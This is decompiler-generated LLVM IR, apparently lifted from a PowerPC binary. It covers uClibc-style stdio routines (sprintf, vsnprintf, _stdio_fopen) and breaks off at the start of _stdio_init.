define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000c970 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c970, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000c9c0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000c9c0, i32* %stack_var_-96, align 4
  store i32 268487116, i32* @lr, align 4
  %v0_1000c9c8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000c9c8
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000c9e8 = load i32, i32* @r4, align 4
  store i32 %v0_1000c9e8, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000ca04 = load i32, i32* @r3, align 4
  %v1_1000ca04 = sub i32 -1, %v0_1000ca04
  store i32 %v1_1000ca04, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000ca04, i32* %r31.global-to-local, align 4
  %v2_1000ca18 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000ca18, i32* @r3, align 4
  %v0_1000ca1c = load i32, i32* @r5, align 4
  store i32 %v0_1000ca1c, i32* %r29.global-to-local, align 4
  %v0_1000ca20 = load i32, i32* @r6, align 4
  store i32 %v0_1000ca20, i32* @r28, align 4
  store i32 268487216, i32* @lr, align 4
  %v0_1000ca2c = call i32 @__stdio_init_mutex()
  %v0_1000ca30 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ca30 = load i32, i32* @r27, align 4
  %v3_1000ca30 = icmp ugt i32 %v0_1000ca30, %v1_1000ca30
  %v0_1000ca34 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000ca34, i32* @r4, align 4
  %v0_1000ca38 = load i32, i32* @r28, align 4
  store i32 %v0_1000ca38, i32* @r5, align 4
  %v2_1000ca3c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000ca3c, i32* @r3, align 4
  br i1 %v3_1000ca30, label %dec_label_pc_1000ca48, label %dec_label_pc_1000ca4c

dec_label_pc_1000ca48:                            ; preds = %entry
  store i32 %v1_1000ca30, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ca4c

dec_label_pc_1000ca4c:                            ; preds = %entry, %dec_label_pc_1000ca48
  %v1_1000ca4c = phi i32 [ %v0_1000ca30, %entry ], [ %v1_1000ca30, %dec_label_pc_1000ca48 ]
  %v0_1000ca4c = load i32, i32* %r31.global-to-local, align 4
  store i32 268487276, i32* @lr, align 4
  %v0_1000ca68 = call i32 @_vfprintf_internal()
  %v0_1000ca6c = load i32, i32* @r30, align 4
  %v3_1000ca6c = icmp eq i32 %v0_1000ca6c, 0
  br i1 %v3_1000ca6c, label %dec_label_pc_1000ca94, label %dec_label_pc_1000ca74

dec_label_pc_1000ca74:                            ; preds = %dec_label_pc_1000ca4c
  %v4_1000ca80 = icmp eq i32 %v1_1000ca4c, 0
  %v1_1000ca7c = sext i1 %v4_1000ca80 to i32
  %v0_1000ca88.v0_1000ca4c = add i32 %v0_1000ca4c, %v1_1000ca7c
  %stack_var_-88.0 = inttoptr i32 %v0_1000ca88.v0_1000ca4c to i8*
  %v0_1000ca90 = load i32, i32* @r26, align 4
  %v1_1000ca90 = trunc i32 %v0_1000ca90 to i8
  store i8 %v1_1000ca90, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000ca94

dec_label_pc_1000ca94:                            ; preds = %dec_label_pc_1000ca4c, %dec_label_pc_1000ca74
  ret i32 %v0_1000ca68

; uselistorder directives
  uselistorder i32 %v0_1000ca04, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca4c, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000caa8 = load i32, i32* @lr, align 4
  store i32 %v0_1000caa8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1000cabc = load i32, i32* @r5, align 4
  store i32 %v0_1000cabc, i32* @r31, align 4
  %v0_1000cac0 = load i32, i32* @r6, align 4
  store i32 %v0_1000cac0, i32* @r29, align 4
  %v3_1000cac4 = load i8, i8* %arg2, align 1
  %v4_1000cac4 = zext i8 %v3_1000cac4 to i32
  store i32 %v4_1000cac4, i32* %r0.global-to-local, align 4
  %v3_1000cac8 = icmp eq i8 %v3_1000cac4, 114
  br i1 %v3_1000cac8, label %dec_label_pc_1000cb14, label %dec_label_pc_1000cad0

dec_label_pc_1000cad0:                            ; preds = %entry
  %v3_1000cad0 = icmp eq i8 %v3_1000cac4, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000cad0, label %dec_label_pc_1000cb18, label %dec_label_pc_1000cadc

dec_label_pc_1000cadc:                            ; preds = %dec_label_pc_1000cad0
  %v3_1000cadc = icmp eq i8 %v3_1000cac4, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_1000cadc, label %dec_label_pc_1000cb18, label %dec_label_pc_1000cae8

dec_label_pc_1000cae8:                            ; preds = %dec_label_pc_1000cba8, %dec_label_pc_1000cb78, %dec_label_pc_1000cadc
  %v0_1000cae8 = call i32 @__errno_location()
  %v0_1000caec = load i32, i32* @r31, align 4
  %v3_1000caec = icmp eq i32 %v0_1000caec, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000caf4 = inttoptr i32 %v0_1000cae8 to i32*
  store i32 22, i32* %v2_1000caf4, align 4
  br i1 %v3_1000caec, label %dec_label_pc_1000cd48, label %dec_label_pc_1000cafc

dec_label_pc_1000cafc:                            ; preds = %dec_label_pc_1000cbdc, %dec_label_pc_1000cae8
  %v0_1000cafc = load i32, i32* @r31, align 4
  %v1_1000cafc = inttoptr i32 %v0_1000cafc to i16*
  %v2_1000cafc = load i16, i16* %v1_1000cafc, align 2
  %v3_1000cafc = zext i16 %v2_1000cafc to i32
  store i32 %v3_1000cafc, i32* %r0.global-to-local, align 4
  %v1_1000cb00 = and i32 %v3_1000cafc, 8192
  store i32 %v1_1000cb00, i32* %r9.global-to-local, align 4
  %v3_1000cb00 = icmp eq i32 %v1_1000cb00, 0
  store i1 %v3_1000cb00, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000cb00, label %dec_label_pc_1000cd48, label %dec_label_pc_1000cb08

dec_label_pc_1000cb08:                            ; preds = %dec_label_pc_1000cafc
  store i32 %v0_1000cafc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000cb10.589 to i32), i32* @lr, align 4
  %v0_1000cb0c = call i32 @free()
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cb14:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000cb18

dec_label_pc_1000cb18:                            ; preds = %dec_label_pc_1000cadc, %dec_label_pc_1000cad0, %dec_label_pc_1000cb14
  %v0_1000cb38 = phi i32 [ 1089, %dec_label_pc_1000cadc ], [ 577, %dec_label_pc_1000cad0 ], [ 1, %dec_label_pc_1000cb14 ]
  %v2_1000cb18 = add i32 %tmp, 1
  %v3_1000cb18 = inttoptr i32 %v2_1000cb18 to i8*
  %v4_1000cb18 = load i8, i8* %v3_1000cb18, align 1
  %v5_1000cb18 = zext i8 %v4_1000cb18 to i32
  store i32 %v5_1000cb18, i32* %r0.global-to-local, align 4
  %v3_1000cb20 = icmp eq i8 %v4_1000cb18, 98
  br i1 %v3_1000cb20, label %dec_label_pc_1000cb2c, label %dec_label_pc_1000cb28

dec_label_pc_1000cb28:                            ; preds = %dec_label_pc_1000cb18
  br label %dec_label_pc_1000cb2c

dec_label_pc_1000cb2c:                            ; preds = %dec_label_pc_1000cb18, %dec_label_pc_1000cb28
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1000cb28 ], [ %v2_1000cb18, %dec_label_pc_1000cb18 ]
  %v0_1000cb2c = phi i32 [ %tmp, %dec_label_pc_1000cb28 ], [ %v2_1000cb18, %dec_label_pc_1000cb18 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000cb2c = add i32 %v0_1000cb2c, 1
  %v2_1000cb2c = inttoptr i32 %v1_1000cb2c to i8*
  %v3_1000cb2c = load i8, i8* %v2_1000cb2c, align 1
  %v4_1000cb2c = zext i8 %v3_1000cb2c to i32
  store i32 %v4_1000cb2c, i32* %r0.global-to-local, align 4
  %v3_1000cb30 = icmp eq i8 %v3_1000cb2c, 43
  br i1 %v3_1000cb30, label %dec_label_pc_1000cb38, label %dec_label_pc_1000cb40

dec_label_pc_1000cb38:                            ; preds = %dec_label_pc_1000cb2c
  store i32 %v0_1000cb38, i32* %r9.global-to-local, align 4
  %v1_1000cb3c = add nuw nsw i32 %v0_1000cb38, 1
  store i32 %v1_1000cb3c, i32* @r28, align 4
  br label %dec_label_pc_1000cb40

dec_label_pc_1000cb40:                            ; preds = %dec_label_pc_1000cb2c, %dec_label_pc_1000cb38
  %v3_1000cb40 = icmp eq i32 %v0_1000cabc, 0
  br i1 %v3_1000cb40, label %dec_label_pc_1000cb48, label %dec_label_pc_1000cb70

dec_label_pc_1000cb48:                            ; preds = %dec_label_pc_1000cb40
  store i32 80, i32* @r3, align 4
  store i32 268487504, i32* @lr, align 4
  %v0_1000cb4c = call i32 @malloc()
  store i32 %v0_1000cb4c, i32* @r31, align 4
  %v4_1000cb50 = icmp eq i32 %v0_1000cb4c, 0
  store i1 %v4_1000cb50, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1000cb50, label %dec_label_pc_1000cd4c, label %dec_label_pc_1000cb58

dec_label_pc_1000cb58:                            ; preds = %dec_label_pc_1000cb48
  %v1_1000cb5c = add i32 %v0_1000cb4c, 56
  store i32 %v1_1000cb5c, i32* @r3, align 4
  %v3_1000cb60 = inttoptr i32 %v0_1000cb4c to i16*
  store i16 8192, i16* %v3_1000cb60, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000cb68 = load i32, i32* @r31, align 4
  %v2_1000cb68 = add i32 %v1_1000cb68, 8
  %v3_1000cb68 = inttoptr i32 %v2_1000cb68 to i32*
  store i32 0, i32* %v3_1000cb68, align 4
  store i32 268487536, i32* @lr, align 4
  %v0_1000cb6c = call i32 @__stdio_init_mutex()
  %v0_1000cb70.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000cb70

dec_label_pc_1000cb70:                            ; preds = %dec_label_pc_1000cb40, %dec_label_pc_1000cb58
  %v0_1000cbd0 = phi i32 [ %v0_1000cac0, %dec_label_pc_1000cb40 ], [ %v0_1000cb70.pre, %dec_label_pc_1000cb58 ]
  %v1_1000cb70 = icmp slt i32 %v0_1000cbd0, 0
  br i1 %v1_1000cb70, label %dec_label_pc_1000cbd0, label %dec_label_pc_1000cb78

dec_label_pc_1000cb78:                            ; preds = %dec_label_pc_1000cb70
  %v1_1000cb7c = add i32 %arg1, 1
  store i32 %v1_1000cb7c, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1000cb84 = load i32, i32* @r31, align 4
  %v2_1000cb84 = add i32 %v1_1000cb84, 4
  %v3_1000cb84 = inttoptr i32 %v2_1000cb84 to i32*
  store i32 %v0_1000cbd0, i32* %v3_1000cb84, align 4
  %v0_1000cb88 = load i32, i32* @r28, align 4
  %v1_1000cb88 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cb88 = and i32 %v1_1000cb88, %v0_1000cb88
  %v1_1000cb8c = add i32 %v2_1000cb88, 1
  store i32 %v1_1000cb8c, i32* %r9.global-to-local, align 4
  %v1_1000cb90 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cb90 = and i32 %v1_1000cb90, %v1_1000cb8c
  store i32 %v2_1000cb90, i32* %r0.global-to-local, align 4
  %v4_1000cb94 = icmp eq i32 %v2_1000cb90, %v1_1000cb8c
  br i1 %v4_1000cb94, label %dec_label_pc_1000cb9c, label %dec_label_pc_1000cae8

dec_label_pc_1000cb9c:                            ; preds = %dec_label_pc_1000cb78
  %v2_1000cb9c = sub i32 -1, %arg1
  %v3_1000cb9c = and i32 %v0_1000cb88, %v2_1000cb9c
  store i32 %v3_1000cb9c, i32* %r0.global-to-local, align 4
  %v1_1000cba0 = and i32 %v3_1000cb9c, 1024
  store i32 %v1_1000cba0, i32* %r9.global-to-local, align 4
  %v3_1000cba0 = icmp eq i32 %v1_1000cba0, 0
  store i1 %v3_1000cba0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000cba0, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cba8

dec_label_pc_1000cba8:                            ; preds = %dec_label_pc_1000cb9c
  %v0_1000cba8 = load i32, i32* @r29, align 4
  store i32 268487612, i32* @lr, align 4
  %v2_1000cbb8 = call i32 @__libc_fcntl(i32 %v0_1000cba8, i32 4)
  %v3_1000cbbc = icmp eq i32 %v2_1000cbb8, 0
  br i1 %v3_1000cbbc, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cae8

dec_label_pc_1000cbc4:                            ; preds = %dec_label_pc_1000cba8, %dec_label_pc_1000cb9c
  %v1_1000cbc4 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1000cbc4, i32* %r0.global-to-local, align 4
  %v0_1000cbc8 = load i32, i32* @r28, align 4
  %v2_1000cbc8 = or i32 %v0_1000cbc8, %v1_1000cbc4
  store i32 %v2_1000cbc8, i32* @r28, align 4
  br label %dec_label_pc_1000cbfc

dec_label_pc_1000cbd0:                            ; preds = %dec_label_pc_1000cb70
  %v3_1000cbd0 = icmp eq i32 %v0_1000cbd0, -1
  %v0_1000cbe0.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000cbd0, label %dec_label_pc_1000cbdc, label %dec_label_pc_1000cbd8

dec_label_pc_1000cbd8:                            ; preds = %dec_label_pc_1000cbd0
  %v1_1000cbd8 = or i32 %v0_1000cbe0.pre, 65536
  store i32 %v1_1000cbd8, i32* @r28, align 4
  br label %dec_label_pc_1000cbdc

dec_label_pc_1000cbdc:                            ; preds = %dec_label_pc_1000cbd0, %dec_label_pc_1000cbd8
  %v0_1000cbe0 = phi i32 [ %v1_1000cbd8, %dec_label_pc_1000cbd8 ], [ %v0_1000cbe0.pre, %dec_label_pc_1000cbd0 ]
  store i32 438, i32* @r5, align 4
  store i32 268487664, i32* @lr, align 4
  %v2_1000cbec = call i32 @__libc_open(i32 %arg1, i32 %v0_1000cbe0)
  %v1_1000cbf0 = icmp slt i32 %v2_1000cbec, 0
  %v1_1000cbf4 = load i32, i32* @r31, align 4
  %v2_1000cbf4 = add i32 %v1_1000cbf4, 4
  %v3_1000cbf4 = inttoptr i32 %v2_1000cbf4 to i32*
  store i32 %v2_1000cbec, i32* %v3_1000cbf4, align 4
  br i1 %v1_1000cbf0, label %dec_label_pc_1000cafc, label %dec_label_pc_1000cbdc.dec_label_pc_1000cbfc_crit_edge

dec_label_pc_1000cbdc.dec_label_pc_1000cbfc_crit_edge: ; preds = %dec_label_pc_1000cbdc
  %v0_1000cc00.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000cbfc

dec_label_pc_1000cbfc:                            ; preds = %dec_label_pc_1000cbdc.dec_label_pc_1000cbfc_crit_edge, %dec_label_pc_1000cbc4
  %v0_1000cc00 = phi i32 [ %v0_1000cc00.pre, %dec_label_pc_1000cbdc.dec_label_pc_1000cbfc_crit_edge ], [ %v2_1000cbc8, %dec_label_pc_1000cbc4 ]
  %v0_1000cbfc = load i32, i32* @r31, align 4
  %v1_1000cbfc = inttoptr i32 %v0_1000cbfc to i16*
  %v2_1000cbfc = load i16, i16* %v1_1000cbfc, align 2
  %v3_1000cbfc = zext i16 %v2_1000cbfc to i32
  store i32 %v3_1000cbfc, i32* %r0.global-to-local, align 4
  %v1_1000cc00 = urem i32 %v0_1000cc00, 4
  store i32 %v1_1000cc00, i32* %r29.global-to-local, align 4
  %v1_1000cc04 = call i32 @__asm_rlwinm(i32 %v0_1000cc00, i32 0, i32 21, i32 21)
  %v1_1000cc08 = add nuw nsw i32 %v1_1000cc00, 1
  store i32 %v1_1000cc08, i32* %r29.global-to-local, align 4
  %v1_1000cc0c = call i32 @__asm_rlwinm(i32 %v3_1000cbfc, i32 0, i32 18, i32 18)
  store i32 %v1_1000cc0c, i32* %r0.global-to-local, align 4
  %v1_1000cc10 = xor i32 %v1_1000cc08, 3
  store i32 %v1_1000cc10, i32* %r29.global-to-local, align 4
  %v1_1000cc14 = urem i32 %v1_1000cc0c, 65536
  store i32 %v1_1000cc14, i32* %r9.global-to-local, align 4
  %v0_1000cc18 = load i32, i32* @r28, align 4
  %v1_1000cc18 = call i32 @__asm_rlwinm(i32 %v0_1000cc18, i32 31, i32 16, i32 16)
  %v2_1000cc1c = or i32 %v1_1000cc18, %v1_1000cc04
  store i32 %v2_1000cc1c, i32* %r0.global-to-local, align 4
  %v0_1000cc20 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000cc20 = mul i32 %v0_1000cc20, 16
  %v0_1000cc24 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cc24 = or i32 %v0_1000cc24, %v2_1000cc1c
  store i32 %v2_1000cc24, i32* %r9.global-to-local, align 4
  %v2_1000cc28 = or i32 %v2_1000cc24, %v1_1000cc20
  store i32 %v2_1000cc28, i32* @r29, align 4
  %v1_1000cc2c = trunc i32 %v2_1000cc28 to i16
  %v2_1000cc2c = load i32, i32* @r31, align 4
  %v3_1000cc2c = inttoptr i32 %v2_1000cc2c to i16*
  store i16 %v1_1000cc2c, i16* %v3_1000cc2c, align 2
  %v0_1000cc30 = call i32 @__errno_location()
  store i32 %v0_1000cc30, i32* @r28, align 4
  %v0_1000cc38 = load i32, i32* @r31, align 4
  %v1_1000cc38 = add i32 %v0_1000cc38, 4
  %v2_1000cc38 = inttoptr i32 %v1_1000cc38 to i32*
  %v3_1000cc38 = load i32, i32* %v2_1000cc38, align 4
  %v1_1000cc3c = inttoptr i32 %v0_1000cc30 to i32*
  %v2_1000cc3c = load i32, i32* %v1_1000cc3c, align 4
  store i32 %v2_1000cc3c, i32* @r27, align 4
  store i32 268487748, i32* @lr, align 4
  %v1_1000cc40 = call i32 @isatty(i32 %v3_1000cc38)
  %v1_1000cc44 = mul i32 %v1_1000cc40, 256
  %v0_1000cc48 = load i32, i32* @r29, align 4
  %v2_1000cc48 = or i32 %v0_1000cc48, %v1_1000cc44
  store i32 %v2_1000cc48, i32* @r29, align 4
  %v1_1000cc4c = trunc i32 %v2_1000cc48 to i16
  %v2_1000cc4c = load i32, i32* @r31, align 4
  %v3_1000cc4c = inttoptr i32 %v2_1000cc4c to i16*
  store i16 %v1_1000cc4c, i16* %v3_1000cc4c, align 2
  %v0_1000cc50 = load i32, i32* @r27, align 4
  %v1_1000cc50 = load i32, i32* @r28, align 4
  %v2_1000cc50 = inttoptr i32 %v1_1000cc50 to i32*
  store i32 %v0_1000cc50, i32* %v2_1000cc50, align 4
  %v0_1000cc54 = load i32, i32* @r31, align 4
  %v1_1000cc54 = add i32 %v0_1000cc54, 8
  %v2_1000cc54 = inttoptr i32 %v1_1000cc54 to i32*
  %v3_1000cc54 = load i32, i32* %v2_1000cc54, align 4
  store i32 %v3_1000cc54, i32* %r0.global-to-local, align 4
  %v3_1000cc58 = icmp eq i32 %v3_1000cc54, 0
  br i1 %v3_1000cc58, label %dec_label_pc_1000cc60, label %dec_label_pc_1000cc90

dec_label_pc_1000cc60:                            ; preds = %dec_label_pc_1000cbfc
  store i32 4096, i32* @r3, align 4
  store i32 268487784, i32* @lr, align 4
  %v0_1000cc64 = call i32 @malloc()
  %v3_1000cc68 = icmp eq i32 %v0_1000cc64, 0
  %v1_1000cc6c = load i32, i32* @r31, align 4
  %v2_1000cc6c = add i32 %v1_1000cc6c, 8
  %v3_1000cc6c = inttoptr i32 %v2_1000cc6c to i32*
  store i32 %v0_1000cc64, i32* %v3_1000cc6c, align 4
  %v1_1000cc8c = load i32, i32* @r31, align 4
  br i1 %v3_1000cc68, label %dec_label_pc_1000cc8c, label %dec_label_pc_1000cc74

dec_label_pc_1000cc74:                            ; preds = %dec_label_pc_1000cc60
  %v1_1000cc74 = inttoptr i32 %v1_1000cc8c to i16*
  %v2_1000cc74 = load i16, i16* %v1_1000cc74, align 2
  %v3_1000cc74 = zext i16 %v2_1000cc74 to i32
  store i32 %v3_1000cc74, i32* %r0.global-to-local, align 4
  %v1_1000cc78 = add i32 %v0_1000cc64, 4096
  store i32 %v1_1000cc78, i32* %r9.global-to-local, align 4
  %v2_1000cc7c = add i32 %v1_1000cc8c, 12
  %v3_1000cc7c = inttoptr i32 %v2_1000cc7c to i32*
  store i32 %v1_1000cc78, i32* %v3_1000cc7c, align 4
  %v0_1000cc80 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cc80 = or i32 %v0_1000cc80, 16384
  store i32 %v1_1000cc80, i32* %r0.global-to-local, align 4
  %v1_1000cc84 = trunc i32 %v1_1000cc80 to i16
  %v2_1000cc84 = load i32, i32* @r31, align 4
  %v3_1000cc84 = inttoptr i32 %v2_1000cc84 to i16*
  store i16 %v1_1000cc84, i16* %v3_1000cc84, align 2
  br label %dec_label_pc_1000cc90

dec_label_pc_1000cc8c:                            ; preds = %dec_label_pc_1000cc60
  %v2_1000cc8c = add i32 %v1_1000cc8c, 12
  %v3_1000cc8c = inttoptr i32 %v2_1000cc8c to i32*
  store i32 0, i32* %v3_1000cc8c, align 4
  br label %dec_label_pc_1000cc90

dec_label_pc_1000cc90:                            ; preds = %dec_label_pc_1000cbfc, %dec_label_pc_1000cc74, %dec_label_pc_1000cc8c
  %v0_1000cc90 = load i32, i32* @r31, align 4
  %v1_1000cc90 = inttoptr i32 %v0_1000cc90 to i16*
  %v2_1000cc90 = load i16, i16* %v1_1000cc90, align 2
  %v3_1000cc90 = zext i16 %v2_1000cc90 to i32
  store i32 %v3_1000cc90, i32* %r0.global-to-local, align 4
  %v1_1000cc94 = add i32 %v0_1000cc90, 8
  %v2_1000cc94 = inttoptr i32 %v1_1000cc94 to i32*
  %v3_1000cc94 = load i32, i32* %v2_1000cc94, align 4
  store i32 %v3_1000cc94, i32* %r9.global-to-local, align 4
  %v1_1000cc98 = and i32 %v3_1000cc90, 8192
  %v3_1000cc98 = icmp eq i32 %v1_1000cc98, 0
  store i1 %v3_1000cc98, i1* %cr0_eq.global-to-local, align 1
  %v3_1000cca0 = add i32 %v0_1000cc90, 2
  %v4_1000cca0 = inttoptr i32 %v3_1000cca0 to i8*
  store i8 0, i8* %v4_1000cca0, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000cca8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cca8 = load i32, i32* @r31, align 4
  %v2_1000cca8 = add i32 %v1_1000cca8, 20
  %v3_1000cca8 = inttoptr i32 %v2_1000cca8 to i32*
  store i32 %v0_1000cca8, i32* %v3_1000cca8, align 4
  %v0_1000ccac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ccac = load i32, i32* @r31, align 4
  %v2_1000ccac = add i32 %v1_1000ccac, 24
  %v3_1000ccac = inttoptr i32 %v2_1000ccac to i32*
  store i32 %v0_1000ccac, i32* %v3_1000ccac, align 4
  %v0_1000ccb0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ccb0 = load i32, i32* @r31, align 4
  %v2_1000ccb0 = add i32 %v1_1000ccb0, 28
  %v3_1000ccb0 = inttoptr i32 %v2_1000ccb0 to i32*
  store i32 %v0_1000ccb0, i32* %v3_1000ccb0, align 4
  %v0_1000ccb4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ccb4 = load i32, i32* @r31, align 4
  %v2_1000ccb4 = add i32 %v1_1000ccb4, 16
  %v3_1000ccb4 = inttoptr i32 %v2_1000ccb4 to i32*
  store i32 %v0_1000ccb4, i32* %v3_1000ccb4, align 4
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v0_1000ccbc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ccbc = load i32, i32* @r31, align 4
  %v2_1000ccbc = add i32 %v1_1000ccbc, 44
  %v3_1000ccbc = inttoptr i32 %v2_1000ccbc to i32*
  store i32 %v0_1000ccbc, i32* %v3_1000ccbc, align 4
  %v3_1000ccc0 = load i32, i32* @global_var_1002859c.590, align 4
  store i32 %v3_1000ccc0, i32* %r0.global-to-local, align 4
  %v1_1000ccc4 = load i32, i32* @r31, align 4
  %v2_1000ccc4 = add i32 %v1_1000ccc4, 52
  %v3_1000ccc4 = inttoptr i32 %v2_1000ccc4 to i32*
  store i32 %v3_1000ccc0, i32* %v3_1000ccc4, align 4
  %v0_1000ccc8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000ccc8, label %dec_label_pc_1000cd4c, label %dec_label_pc_1000cccc

dec_label_pc_1000cccc:                            ; preds = %dec_label_pc_1000cc90
  store i32 ptrtoint ([3 x i8]* @global_var_10010ad0.584 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10028258.585 to i32), i32* %r29.global-to-local, align 4
  %v2_1000ccdc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ccdc, i32* @r26, align 4
  store i32 %v2_1000ccdc, i32* @r3, align 4
  %v0_1000ccec = call i32 @__pthread_return_void()
  %v2_1000ccf8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000ccf8, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10028240.591 to i32), i32* @r29, align 4
  %v0_1000cd00 = call i32 @__pthread_return_0()
  store i32 %v2_1000ccf8, i32* @r3, align 4
  %v0_1000cd10 = call i32 @__pthread_return_void()
  %v0_1000cd18 = call i32 @__pthread_return_0()
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_1000cd20 = load i32, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  store i32 %v3_1000cd20, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ccf8, i32* @r3, align 4
  %v1_1000cd2c = load i32, i32* @r31, align 4
  %v2_1000cd2c = add i32 %v1_1000cd2c, 32
  %v3_1000cd2c = inttoptr i32 %v2_1000cd2c to i32*
  store i32 %v3_1000cd20, i32* %v3_1000cd2c, align 4
  %v0_1000cd30 = load i32, i32* @r31, align 4
  store i32 %v0_1000cd30, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  %v0_1000cd34 = call i32 @__pthread_return_void()
  store i32 %v2_1000ccdc, i32* @r3, align 4
  %v0_1000cd40 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000cd4c

dec_label_pc_1000cd48:                            ; preds = %dec_label_pc_1000cafc, %dec_label_pc_1000cae8, %dec_label_pc_1000cb08
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000cd4c

dec_label_pc_1000cd4c:                            ; preds = %dec_label_pc_1000cc90, %dec_label_pc_1000cb48, %dec_label_pc_1000cccc, %dec_label_pc_1000cd48
  store i32 %v0_1000caa8, i32* %r0.global-to-local, align 4
  %v0_1000cd50 = load i32, i32* @r31, align 4
  ret i32 %v0_1000cd50

; uselistorder directives
  uselistorder i32 %v1_1000cc8c, { 2, 0, 1 }
  uselistorder i32 %v0_1000cc00, { 1, 0 }
  uselistorder i32 %v0_1000cb4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000cb38, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 21, { 1, 2, 0, 3, 4 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000cd4c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cd48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cc90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cbdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb70, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb40, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb18, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268632064, i32* @r28, align 4
  %v0_1000cd78 = call i32 @__errno_location()
  store i32 %v0_1000cd78, i32* @r26, align 4
  %v1_1000cd84 = inttoptr i32 %v0_1000cd78 to i32*
  %v2_1000cd84 = load i32, i32* %v1_1000cd84, align 4
  store i32 %v2_1000cd84, i32* @r25, align 4
